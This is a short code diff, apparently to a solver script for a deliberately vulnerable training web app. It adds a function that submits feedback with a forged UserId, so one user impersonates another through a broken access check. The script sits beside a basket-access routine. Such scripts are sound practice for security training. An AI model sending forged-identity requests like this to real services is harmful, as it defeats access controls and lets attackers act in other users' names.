@@ -125,6 +125,18 @@ def access_another_user_basket(server, session):
         )
 
 
+def submit_feedback_as_another_user(server, session, user_id):
+    current_user_id = get_current_user_id(server, session)
+    payload = {
+        "comment": "I'm submitting evil feedback!",
+        "UserId": user_id,
+    }
+    print(
+        f"Submitting feedback from user ID {current_user_id} as user ID {user_id}..."
+    ),
+    send_feedback(server, session, payload)
+
+
 def check_for_data_leakage(url):
     """
     Sends a request to the URL and checks the response for potential data leakage.
